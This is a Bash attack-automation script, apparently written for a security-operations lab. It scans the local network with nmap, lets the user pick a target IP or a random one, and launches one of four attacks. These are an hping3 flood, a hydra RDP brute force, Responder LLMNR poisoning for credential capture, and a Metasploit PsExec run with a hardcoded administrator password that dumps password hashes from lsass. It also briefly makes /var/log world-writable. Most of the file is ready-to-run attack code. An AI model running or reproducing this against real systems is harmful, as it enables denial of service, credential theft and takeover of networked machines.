#!/bin/bash
#The script will first start with declaring functions and assigning variables.
#Then it will scan for available machines and ports.
#It will then prompt the user to select a target IP Address.
#Lastly, it will prompt the user to select an attack to perform against
#the selected IP.

#These colour codes are for some quality of life enhancements to 
#highlight some outputs from the script.
RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[0;33m'
BGRN='\033[1;32m'
BCYN='\033[1;36m'
BIRED='\033[1;91m'
BGYLW='\033[43m'
UYLW='\033[4;33m'
CLR='\033[0m'

#Now the various functions will be declared.
#This function is for stopping the script until a key is pressed.
#This is for letting the user take note of certain details before continuing.
function pressany()
{
read -n 1 -r -s -p $'Press any key to continue...\n'
}

#This function is for a Denial of Serivce attack using Hping3.
#It gives the user the characteristics of such attacks as well as some
#additional details and instructions specific to the scipt.
#It will record the time, type and target of the attack in a log in /var/log.
function dosatk()
{
echo ' '
echo -e "You have selected a ${UYLW}DOS${CLR} attack against ${UYLW}$IPTARGET${CLR}"
echo 'Denial of Service attacks involve overwhelming your target with packets
of data and making it harder or impossible for targets to be accessed due to
resource hogging and bandwidth choking.'
echo 'Symptoms usually include websites not loading and system resources 
being fully utilised.'
echo 'Such attacks usually come from external sources but compromised machines
can also launch such attacks against other machines on the same network.'
echo 'For this attack, this script uses hping3 attacking on --flood mode, meaning
that packets are sent on the fastest possible setting.'
echo ' '
echo -e "${BGYLW}WARNING!!!${CLR} The attack WILL GO ON INDEFINTELY!"
echo -e "After test requirements are satisfied, you ${BIRED}MUST MANUALLY ENTER:
!!! CONTROL+C !!! ${CLR}"
echo ' '
pressany

ATKTIME=$(TZ=Asia/Singapore date)
sudo chmod 777 /var/log 
echo "$ATKTIME hping3-DOS $IPTARGET" >> /var/log/socatk.log
sudo chmod 755 /var/log 
echo -e "Attack details saved to ${BCYN}/var/log/socatk.log${CLR}"
	sudo hping3 "$IPTARGET" -p 80 -d 100 --flood

}

#This function is for a brute force attack using Hydra.
#It gives the user the characteristics of such attacks as well as some
#additional details specific to the scipt.
#It will record the time, type and target of the attack in a log in /var/log.
function bfatk()
{
echo ' '
echo -e "You have selected a ${UYLW}brute force${CLR} attack against ${UYLW}$IPTARGET${CLR}"
echo 'Brute force attacks involve trying different combinations of
user names and passwords to determine the correct login credentials.'
echo 'Symptoms may include an usually high number of unsuccessful login
attempts and an unusual increase in network traffic to certain ports or services.
Attacks can originate externally as well as internally from compromised
machines.'
echo 'If used with approval, it can be used to check if users have good
password hygiene and not re-using old passwords.'
echo 'For this attack, hydra is the program used for brute forcing.
It will refer to a provided list of credentials and make use of
the remote desktop protocol for windows systems.'
echo ' '
pressany

ATKTIME=$(TZ=Asia/Singapore date)
sudo chmod 777 /var/log 
echo "$ATKTIME hydra $IPTARGET" >> /var/log/socatk.log
sudo chmod 755 /var/log 
echo -e "Attack details saved to ${BCYN}/var/log/socatk.log${CLR}"
	sudo hydra -L pilotroster.txt -P pilotauth.txt "$IPTARGET" rdp -vV
	
}

#This function is for LLMNR poisoning using Responder.
#It gives the user the characteristics of such attacks as well as some
#additional details and instructions specific to the scipt.
#It will record the time, type and target of the attack in a log in /var/log.
function typoatk()
{
echo ' '
echo -e "You have selected ${UYLW}LLMNR poisoning${CLR} for ${UYLW}$SELFIPRNG${CLR}"
echo 'This attack has no specific target and will listen to all machines
on the network. Whenever a user makes a typo and responds to an authentication
request, the user credentials will be sent over to the listening machine.'
echo 'The intercepted hash can be cracked by programs such as John the Ripper.'
echo ' '
echo 'After test requirements are satisfied,
please manually enter'
echo -e "${BIRED}CONTROL+C${CLR}"
echo "as per the developer's opening message."
echo ' '
pressany

ATKTIME=$(TZ=Asia/Singapore date)
sudo chmod 777 /var/log 
echo "$ATKTIME responder-LLMNR 172.16.50.0/24" >> /var/log/socatk.log
sudo chmod 755 /var/log
echo -e "Attack details saved to ${BCYN}/var/log/socatk.log${CLR}"

	sudo responder -I eth0
}

#This function is for a Metasploit attack using the PsExec module.
#It gives the user the characteristics of such attacks as well as some
#additional details and instructions specific to the scipt.
#It will record the time, type and target of the attack in a log in /var/log.
function psxatk()
{
echo ' '
echo -e "You have selected a ${UYLW}Metasploit PsExec${CLR} attack against ${UYLW}$IPTARGET${CLR}"
echo 'This is an advanced attack that allows commands to be remotely executed
on a windows machine using the SMB protocol. Being a form of post-exploitation
attack, it requires some some existing vulnerabilities or incorrect
configuration to be present on the target machine.
Remote commands are executed via a meterpreter console. Various actions such as
modifying files, creating a new user, keystroke mapping can be done.
Hence, such attacks are best used using credentials with admin rights.'
echo ' '
echo 'For this script, the target machine should have a shared folder that
anyone can access with full control and an antivirus that is not working properly.
The remote commands scripted to run will be to get user ID, system info
and a hashdump of all the user credentials on the target machine.'
echo ' '
echo -e "${BGYLW}NOTE:${CLR} Due to some aspects of the module coding, this attack cannot be fully
      automated. After the attack is executed, please perform the following:"
echo '1 - Wait 15 seconds'
echo "2 - MANUALLY type 'exit' "
echo '3 - Hit Enter'
echo ' '
echo 'The bash script will the continue to run by exiting the msfconsole and
displaying the details of the attack.'
echo ' '
pressany

ATKTIME=$(TZ=Asia/Singapore date)
sudo chmod 777 /var/log 
echo "$ATKTIME metasploit-psexec $IPTARGET" >> /var/log/socatk.log
sudo chmod 755 /var/log
echo -e "Attack details saved to ${BCYN}/var/log/socatk.log${CLR}"
echo 'Commencing attack...'
echo -e "After ${BGRN}15 seconds${CLR}, type ${BGRN}'exit'${CLR} and hit ${BGRN}Enter${CLR}"
	echo 'use exploit/windows/smb/psexec' > psxatk.rc
	echo "set rhosts $IPTARGET" >> psxatk.rc
	echo 'set smbdomain mydomain.local' >> psxatk.rc
	echo 'set smbpass Passw0rd!' >> psxatk.rc
	echo 'set smbshare ShareShare' >> psxatk.rc
	echo 'set smbuser administrator' >> psxatk.rc
	echo 'set AutoRunScript psxatk2.rc' >> psxatk.rc
	echo 'run' >>psxatk.rc
	echo 'exit' >> psxatk.rc

	echo 'migrate -N lsass.exe' > psxatk2.rc
	echo 'getuid' >> psxatk2.rc
	echo 'sysinfo' >> psxatk2.rc
	echo 'hashdump' >> psxatk2.rc


msfconsole -qr psxatk.rc -o psxatkres.txt
cat psxatkres.txt

}


#This is the start of the script where it will perform reconnaissance to
#1)determine the IP of the machine that is running the script
#2)determine the network range of the network the machine is on
#3)scan for available IP addresses on the network
echo 'Greetings, User.'
SELFIP=$(ifconfig | grep broadcast | awk '{print$2}')
SELFIPRNG=$(ipcalc $SELFIP | grep Network | awk '{print$2}')
echo "The IP of your current machine is $SELFIP"
echo "Its network range is $SELFIPRNG"
echo ' '
echo 'This script will first scan for IP addresses on your network and
prompt you to choose one. You will then need to select one kind of attack
for the chosen IP address.'
echo ' '
echo 'Now performing nmap scans for available IP addresses to attack...'
nmap "$SELFIPRNG" -oG nmaptgt.txt

cat nmaptgt.txt | grep Up | awk '{print$2}' > shortlist.txt
echo 'The available IP addresses for attack are:'
cat shortlist.txt
echo ' '
echo 'Please enter the IP address you wish to attack, or press r for random'
read IPCHOICE

case $IPCHOICE in
	r)
		echo 'You have opted for a randomly selected IP address.'

		IPCOUNTER=$(cat shortlist.txt | wc -l)
		IPRANDOM=$(echo $(( $RANDOM%$IPCOUNTER+1)))

		IPRANDOMFIN=$(cat shortlist.txt | head -n $IPRANDOM | tail -n 1)
		echo "Your randomly selected IP address is $IPRANDOMFIN"
		IPTARGET=$IPRANDOMFIN
	
	;;
	*) 
		echo "You have selected $IPCHOICE as your target."
		IPTARGET=$IPCHOICE
		
esac
echo ' '
echo -e "${GRN}$IPTARGET has been locked in.${CLR}"
echo ' '
#This portion of the script prompts the user to select which attack to
#perform. There is a short description of each to help the user make
#a decision.

echo 'Please select which attack you like to perform:'
echo '1. Denial of Service (hping3)
   A simple attack that does not steal credentials but drains resources.'
echo '2. Brute Force (hydra)
   An attack that involves throwing sets of credentials against a target to see which one works.'
echo '3. Link-Local Multicast Name Resolution (responder)
   A passive attack that picks up credentials whenever a user makes a typo.'
echo '4. PsExec (msfconsole)
   Best used on targets with admin credentials, this advanced attack can cause massive damage.'
echo '5. Random
   An attack will be randonly selected from the above.'
   
read ATTACKNO

case $ATTACKNO in
	1)
		echo 'You have selected Denial of Service.' 
			dosatk
			
	;;
	2)
		echo 'You have selected Brute Force.'
			bfatk
			
	;;
	3)
		echo 'You have selected Link-Local Multicast Name Resolution.'
			typoatk
			
	;;
	4)
		echo 'You have selected PsExec.'
			psxatk
		
    ;;
	5)
		echo 'You have selected a random attack.'
			ATKRANDOM=$((RANDOM%4+1))
			echo "Your random attack is $ATKRANDOM"
				case $ATKRANDOM in
				1)
					echo 'You have selected Denial of Service.' 
						dosatk
				;;
				2)
					echo 'You have selected Brute Force.'	
						bfatk
				;;
				3)
					echo 'You have selected Link-Local Multicast Name Resolution.'
						typoatk
				;;
				4)
					echo 'You have selected PsExec.'
						psxatk
				esac
	;;
	*)
		echo 'Invalid option. Please execute this script again.'
	exit
esac 
